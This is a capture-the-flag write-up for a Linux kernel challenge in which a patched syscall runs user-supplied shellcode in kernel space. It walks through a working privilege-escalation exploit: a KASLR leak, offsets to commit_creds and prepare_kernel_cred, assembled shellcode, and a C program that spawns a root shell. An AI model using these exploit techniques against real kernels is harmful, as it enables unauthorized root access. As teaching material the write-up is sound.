
# Cetified Kernel Developer writeup

## Analysis

We're given a patchfile for the linux kernel -  

```
--- linux-5.15.15/kernel/sys.c    2022-01-16 08:12:45.000000000 +0000
+++ linux-5.15.15_modified/kernel/sys.c    2022-01-16 16:47:46.802068616 +0000
@@ -4,7 +4,6 @@
  *
  *  Copyright (C) 1991, 1992  Linus Torvalds
  */
-
 #include <linux/export.h>
 #include <linux/mm.h>
 #include <linux/utsname.h>
@@ -2694,4 +2693,15 @@ COMPAT_SYSCALL_DEFINE1(sysinfo, struct c
         return -EFAULT;
     return 0;
 }
+
+SYSCALL_DEFINE2(cope, char __user *, copede, uint64_t, cope_len){
+    unsigned long ret;
+    void *area = ksys_mmap_pgoff(NULL, cope_len, PROT_WRITE | PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
+    if (area == -1 || cope_len > 0x1000 || copy_from_user(area, copede, cope_len)) {
+        return -1;
+    }
+    ret = ((unsigned long(*)(void))area)();
+    vm_munmap(area, cope_len);
+    return ret;
+}
 #endif /* CONFIG_COMPAT */

--- linux-5.15.15/arch/x86/entry/syscalls/syscall_64.tbl    2022-01-16 08:12:45.000000000 +0000
+++ linux-5.15.15_modified/arch/x86/entry/syscalls/syscall_64.tbl    2022-01-16 14:24:10.077201566 +0000
@@ -413,5 +413,6 @@
 545    x32    execveat        compat_sys_execveat
 546    x32    preadv2            compat_sys_preadv64v2
 547    x32    pwritev2        compat_sys_pwritev64v2
+548 64  cope            sys_cope
 # This is the end of the legacy x32 range.  Numbers 548 and above are
 # not special and are not to be used for x32-specific syscalls.
```

As well as a bzImage (a compressed kernel image) and initramfs.cpio (a compressed filesystem)  
and the run script being used to run the kernel remotely  

```
#!/bin/sh

qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./initramfs.cpio.gz \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-cpu qemu64,+smep,+smap \
-smp 2 \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic \
-monitor /dev/null \
```

This shows us that the remotely available kernel has kASLR, SMEP and SMAP enabled  
It also has the monitor disabled, so no easy win is available by triggering the qemu monitor (imagine...)  

So, analysing the patchfiles -  

The file used by the kernel to generate the syscall table `arch/x86/entry/syscalls/syscall_64.tbl` has been modified -  
it includes a new syscall, `sys_cope` as number 548  

This syscall is defined in `kernel/sys.c` in the other part of the patchfile, as  

```
SYSCALL_DEFINE2(cope, char __user *, copede, uint64_t, cope_len){
    unsigned long ret;
    void *area = ksys_mmap_pgoff(NULL, cope_len, PROT_WRITE | PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (area == -1 || cope_len > 0x1000 || copy_from_user(area, copede, cope_len)) {
        return -1;
    }
    ret = ((unsigned long(*)(void))area)();
    vm_munmap(area, cope_len);
    return ret;
}
```

`SYSCALL_DEFINE2` is a macro used to define new syscalls - the number indicates how many arguments it takes (in this case, 2)  
so the auto-generated prototype for this function would look like  
`asmlinkage unsigned long sys_cope(char __user *copede, uint64_t cope_len)`

`char __user *copede` indicates a pointer to a char array in userspace, and `cope_len` is just a 64 bit integer  

Then, it calls an mmap-equivalent function to create an RWX memory area at least as long as `cope_len`,  
and copies the data in userspace from copede into that memory area  
It then performs some unholy casting to tell C that area is actually a function that takes no arguments and returns an unsigned long,
before calling that function.  

So, this is pretty simple - it takes shellcode passed to it from userspace, copies it to kernel space and executes it  
obviously this is an awful idea security-wise, as it allows every user on the machine to run code in kernel space,  
meaning privilege escalation should be trivial  
But how do we actually escalate privileges?  


## Exploitation

First, let's test both the syscall and our ability to add files locally  

We can use the [indirect syscall function](https://man7.org/linux/man-pages/man2/syscall.2.html) to call syscall number 548,  
We'll just have it set the return value to 42, and we'll check if we get that back  

First, we make this C file - I called it mald.c  

```
#include <stdio.h>
#include <unistd.h>

void main() {

    char mald[] = "\x48\xC7\xC0\x2A\x00\x00\x00\xC3";
    // mov rax, 42;
    // ret;

    long ret = syscall(548, mald, sizeof(mald));
    
    printf("return value: %d\n", ret);

}
```

Now, we can insert this into the starting filesystem -  
First, decompress the cpio file into fs/  

`gunzip initramfs.cpio.gz; mkdir fs; cp initramfs.cpio fs/; cd fs; cpio -idm < ./initramfs.cpio`  
Then compile mald.c (statically - since the box may be missing libraries), put it in /home/ctf/mald in the filesystem, and recompress the filesystem  
`gcc mald.c -o mald -static; cp mald fs/home/ctf/mald; cd fs; find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz; cd ..`  

Now, use the run script and `mald` should be in the home directory when the vm starts up
Run it - and it returns 42, as expected  

So, to begin writing our exploit -  
Unlike a challenge in userspace, we're not looking to spawn a shell - we already have suitable processes in userspace  
instead, we want to take advantage of the unlimited power of the kernel to upgrade our currently running process to root  

Each running process also has an associated task struct stored within the kernel,  
hich contains all the various attributes of this process -  
this structure is [huge](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L723)  
but the most important part for us is this -   

```
struct task_struct {
        ...

	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;

        ...
```
The credentials (UID, GID, etc) for that process are stored in this struct -  
in other words, if we can overwrite the credentials to those of root (UID 0) for a process of ours in userspace,  
then that process will become owned by root - and we've escalated our privileges  

There are already functions within the kernel that are intended to be used for this purpose -  
[prepare_kernel_cred](https://elixir.bootlin.com/linux/latest/source/kernel/cred.c#L717) and [commit_creds](https://elixir.bootlin.com/linux/latest/source/kernel/cred.c#L447)  
So, we want our shellcode to call `commit_creds(prepare_kernel_cred(0))`  

First, we need to know where those functions are - as kASLR is enabled, the base address of the kernel is randomised  
meaning the position of these functions are not constant  
however, we can get around this quite easily  

The return address into sys_cope is stored on the stack when our given shellcode is called,  
we can easily retrieve this from the stack -  
only the base address of the kernel is randomised, not the order of the functions within it  
this means that relative offsets between functions are always the same - for example,  
if function A is at 0x1000 and function B is at 0x2000, regardless of where the base of the kernel is loaded  
function B will always be 0x1000 bytes ahead of function A  
(this is the same trick used to bypass ASLR in kernel space)  

So, we want to leak this return address  
Then calculate the distance to `prepare_kernel_cred` and `commit_creds` from it  

Writing the shellcode to get the return address is easy -  
since the last instruction to run was the call, the return address is at the top of the stack - rsp is pointing to it  
we can return that (instead of 42) and print it to the terminal.  

To find the addresses of the two functions, we'll examine /proc/kallsyms -  
reading this special file (actually a function implemented in the kernel - read [this](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html) for more info on /proc) provides the addresses of every kernel symbol, including our two functions  
however, if you read /proc/kallsyms as a user that isn't root, every address will be listed as 0 as a security measure -  
so, we want to set the kernel to start us as root rather than ctf, so we can check our offsets  

To do this, modify fs/init to say  
`setsid cttyhack setuidgid 0 sh`

Instead of  
`setsid cttyhack setuidgid 1000 sh`

Next, write the shellcode to retrieve the return address -  

```
mov rax, [rsp];
ret;
```

is "\x48\x8B\x04\x24\xC3"

```
#include <stdio.h>
#include <unistd.h>

void main() {

    char mald[] = "\x48\x8B\x04\x24\xC3";
    // mov rax, [rsp];
    // ret;

    long ret = syscall(548, mald, sizeof(mald));
    
    printf("return value: %p\n", ret);

}
```

and run it  

we get  
`return value: 0xffffffff85a79e72`

Now, read /proc/kallsyms to find the addresses of the two functions we want to call -  
```
cat /proc/kallsyms | grep commit_creds
cat /proc/kallsyms | grep prepare_kernel_cred
```
```
ffffffff85a8ac70 T commit_creds
ffffffff85a8af10 T prepare_kernel_cred
```

so, the offsets (relative to the return address) are  
```
+0x10dfe to commit_creds
+0x1109e to prepare_kernel_cred
```

Now that we know the offsets,  
we can write assembly to call `commit_creds(prepare_kernel_creds(0))`  

```
mov rax, [rsp];
add rax, 0x1109e;

xor rdi, rdi;
call rax;

mov rdi, rax;
mov rax, [rsp];
add rax, 0x10dfe;
call rax;

ret;
```

Which assembles to "\x48\x8B\x04\x24\x48\x05\x9E\x10\x01\x00\x48\x31\xFF\xFF\xD0\x48\x89\xC7\x48\x8B\x04\x24\x48\x05\xFE\x0D\x01\x00\xFF\xD0\xC3"

```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void main() {

    char mald[] = "\x48\x8B\x04\x24\x48\x05\x9E\x10\x01\x00\x48\x31\xFF\xFF\xD0\x48\x89\xC7\x48\x8B\x04\x24\x48\x05\xFE\x0D\x01\x00\xFF\xD0\xC3";

    syscall(548, mald, sizeof(mald));
    
    printf("UID: %d\n", getuid());
    
    system("/bin/sh");

}
```

Now to test,  
edit the init file back to make us not root  

Include the exploit in the filesystem  
start the vm  
and run the exploit  
and we should end up as root  

and indeed, we do  

if we run this file on the remote kernel,  
we can now read /root/flag.txt  

flag: `WMG{c0p3_sy5c4ll_seethe_and_mald}`



